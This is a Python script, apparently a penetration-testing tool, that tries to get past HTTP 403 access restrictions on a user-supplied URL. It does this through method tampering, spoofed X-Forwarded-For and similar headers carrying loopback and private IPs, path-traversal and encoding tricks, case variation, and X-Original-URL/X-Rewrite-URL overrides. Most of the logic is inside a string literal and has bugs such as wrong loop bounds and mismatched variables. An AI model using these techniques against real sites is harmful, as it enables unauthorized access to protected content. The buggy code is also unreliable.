import requests
import pyinputplus as pyip
print("[!!!!] Please make your target with the format like this https://x.xyz/secret or https://x.xyz/y/z/secret")
target = str(pyip.inputRegex(r"https?://[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+(/[a-zA-Z0-9._-]+)+")) #python3 https://dajsd/admin
#tach domain name va secret
print("- "*50)
print( f"Bypassing 403 error of {target}")
print("- "*50)

'''
t=0
hy = -1
vitrigach = []
vitricham = []
for k in target:
    hy = hy + 1
    if k == "/":
        vitrigach.append(hy)
    if k == ".":
        vitricham.append(hy)
locatecham = vitricham[0]
locategach1 = vitrigach[1]
locategachcuoi = vitrigach[len(vitrigach)-1]
for q in target:
    domainname = target[0:vitrigach[2]]
    secretvoigach = target[locategachcuoi:len(target)]
    secretkogach = target[locategachcuoi+1:len(target)]



print("[*]HTTP method bypass starting......")
http_method = ['OPTIONS','GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'TRACE', 'CONNECT', 'PROPFIND', 'PATCH', 'MOVE', 'FOOL' ]
for x in http_method:
    try:
        r = requests.request(x, target, timeout=5)
        if r.status_code != 403:
            print(f"{x} method with {r.status_code} code is possible for bypass")
    except requests.exceptions.RequestException as e:
        print(f"{x} → ERROR ({e.__class__.__name__})")


print("[*]HTTP method bypass finished.")

print("[*]IP bypass starting......")
ip_bypass_headers= [ "X-Forwarded-For", "X-Forward-For", "X-Real-IP","X-Custom-IP-Authorization","X-Remote-IP", "X-Originating-IP","X-Remote-Addr","X-Client-IP" ]
ip_values=[ "localhost", "localhost:80", "localhost:443", "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "2130706433", "0x7F000001", "0177.0000.0000.0001", "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", "172.16.0.1", "192.168.1.0", "192.168.1.1"]

for i in range(0,7):
    for k in range(0, 16):
        try:
            headers= {ip_bypass_headers[i]:ip_values[k]}
            
            r = requests.get(target ,headers=headers, timeout=2)
            if r.status_code != 403:
                print(f"{ip_bypass_headers[i]} with {ip_values[k]} ip values is possible for bypass")
        except requests.exceptions.RequestException as e:
            print(f"{x} → ERROR ({e.__class__.__name__})")
print("[*]IP bypass finished.....")


print("[*]Path manipulation starting.....")

headers = {
    "User-Agent": "Mozilla/5.0"
}

paths = ["/%2e/", "/..;/", "/%20", "/%09", "/%00", ".json", ".css", ".html", "?", "??", "???", "?testparam", "#", "#test", "/.", "//", "/././", "/..%2f", "/.%2e/", "/%2e%2e/", "/..%00/", "/%2e%2e%2f", "/..%c0%af","/..%e0%80%af", "/..\\", "/...//", "/....//"]
for x in paths:
    
    
    
    try:
        r = requests.get(target+x, timeout=3 )
        if r.status_code != 403:
            
            print(x)
            print(f"status code:{r.status_code}|content length: {len(r.content)}|response time:{r.elapsed.total_seconds()}")
    except requests.exceptions.Timeout:
        print(f"{x}-> Timeout error")
print("[*]Path manipulation completed")

print("[*]Path race conditions starting....")
for x in range(1, 10):
    try:
        r = requests.get(target+secretvoigach*x, timeout=3 )
        if r.status_code != 403:
            print(target+secretvoigach*x)
            print(f"status code:{r.status_code}|content length: {len(r.content)}|response time:{r.elapsed.total_seconds()}")
    except requests.exceptions.Timeout:
        print(f"{target+secretvoigach*x}-> Timeout")
print("[*]Path race conditions started....")


print("[*]File system case-sensitive starting.....")
try:
    r = requests.get(domainname + secretvoigach.upper())
    
    if r.status_code != 403:
        print(secretvoigach.upper())
        print(f"status code:{r.status_code}|content length: {len(r.content)}|response time:{r.elapsed.total_seconds()}")
except requests.exceptions.Timeout:
    print(f"{secretvoigach.upper()}-> Timeout")
try:
    r2 = requests.get(domainname + secretvoigach.title())
    if r.status_code != 403:
        print(secretvoigach.title())
        print(f"status code:{r2.status_code}|content length: {len(r2.content)}|response time:{r2.elapsed.total_seconds()}")
except requests.exceptions.Timeout:
    print(f"{secretvoigach.title()}-> Timeout")

for i in range(0,len(secretvoigach)-1):
    t = t +1
    fs = secretvoigach[:t-1] +secretvoigach[t-1:t].upper()+secretvoigach[t:]
    try:
        r = requests.get(domainname + fs, timeout = 3)
        if r.status_code != 403:
            print(domainname+fs)
            print(f"status code:{r.status_code}|content length: {len(r.content)}|response time:{r.elapsed.total_seconds()}")
    except requests.exceptions.Timeout:
        print(f"{domainname+fs}-> Timeout")
print("[*]File system case-sensitive finished.")

print("[*]Header overrides starting.....")
headers = {"X-Original-URL":secretvoigach,"X-Rewrite-URL":secretvoigach,"X-Forwarded-Host":secretvoigach,"X-Forwarded-For":secretvoigach}

for x in headers:
    try:
        r = requests.get(target, timeout = 3,headers=headers )
        if r.status_code != 403:
            print(x)
            print(f"status code:{r.status_code}|content length: {len(r.content)}|response time:{r.elapsed.total_seconds()}")
    except requests.exceptions.Timeout:
        print(f"{x}-> Timeout")
print("[*]Header overrides finished.")
'''